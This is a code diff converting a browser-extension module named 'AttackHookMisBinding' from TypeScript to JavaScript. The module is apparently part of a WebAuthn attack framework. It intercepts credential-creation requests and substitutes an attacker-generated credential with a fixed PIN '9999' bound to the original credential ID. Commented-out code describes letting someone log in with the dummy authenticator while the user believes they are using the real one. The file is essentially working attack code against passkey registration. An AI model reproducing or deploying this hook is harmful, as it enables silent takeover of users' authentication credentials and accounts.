@@ -1,15 +1,11 @@
-import { AttackHook } from './attack_hook';
-import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils';
-import { generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
-// import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
-import { WebAuthnRequestMessage, WebAuthnResponseMessage, WebAuthnErrorMessage } from '../types/types';
-
+import { AttackHook } from './attack_hook.js';
+import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils.js';
+import { generateRegistrationKeyAndAttestation } from '../webauthn.js';
 export class AttackHookMisBinding extends AttackHook {
-    getName(): string {
+    getName() {
         return 'attack-mis-binding';
     }
-
-    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
+    async onCredentialCreate(msg, sender) {
         if (!sender.url) {
             return {
                 requestID: msg.requestID,
@@ -18,25 +14,16 @@ export class AttackHookMisBinding extends AttackHook {
             };
         }
         const origin = getOriginFromUrl(sender.url);
-
         const originalCredential = webauthnParse(msg.originalCredential);
-
         const id = originalCredential.id;
         const rawId = Array.from(new Uint8Array(originalCredential.rawId));
         try {
             if (!origin) {
-                throw new Error("BROKEN FUNCTIONALITY misbinding. No origin")
+                throw new Error("BROKEN FUNCTIONALITY misbinding. No origin");
             }
             const opts = webauthnParse(msg.options);
             console.log(msg);
-            const credential = await generateRegistrationKeyAndAttestation(
-                origin,
-                opts.publicKey,
-                '9999',
-                id,
-                rawId,
-            );
-
+            const credential = await generateRegistrationKeyAndAttestation(origin, opts.publicKey, '9999', id, rawId);
             console.log('create credential');
             console.log(credential);
             console.log(webauthnStringify(credential));
@@ -46,38 +33,34 @@ export class AttackHookMisBinding extends AttackHook {
                 requestID: msg.requestID,
                 type: 'create_response',
             };
-        } catch (e) {
+        }
+        catch (e) {
             if (e instanceof DOMException) {
                 const { code, message, name } = e;
                 console.log('failed to import key due to DOMException', { code, message, name }, e);
-            } else {
+            }
+            else {
                 console.log('failed to import key', { errorType: `${(typeof e)}` }, e);
             }
-
             return {
                 requestID: msg.requestID,
                 type: 'error',
-                exception: e!.toString()
+                exception: e.toString()
             };
         }
     }
-
-    async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
-
+    async onCredentialGet(msg, sender) {
         return {
             type: 'sign_response',
             requestID: msg.requestID,
             credential: msg.originalCredential,
-        }
-
+        };
         //  Uncooment the following to allow login using the dummy authenticator while user thinks they are logging through real.
         // const origin = getOriginFromUrl(sender.url);
         // const opts = webauthnParse(msg.options);
-
         // log.debug(opts);
         // // const pin = await requestPin(sender.tab.id, origin);
         // log.debug('Origin in background sign function', origin);
-
         // try {
         //     const credential = await generateKeyRequestAndAttestation(origin, opts.publicKey, `9999`);
         //     const authenticatedResponseData = {
@@ -97,7 +80,6 @@ export class AttackHookMisBinding extends AttackHook {
         //     } else {
         //         log.error('failed to sign', { errorType: `${(typeof e)}` }, e);
         //     }
-
         //     return {
         //         requestID: msg.requestID,
         //         type: 'error',
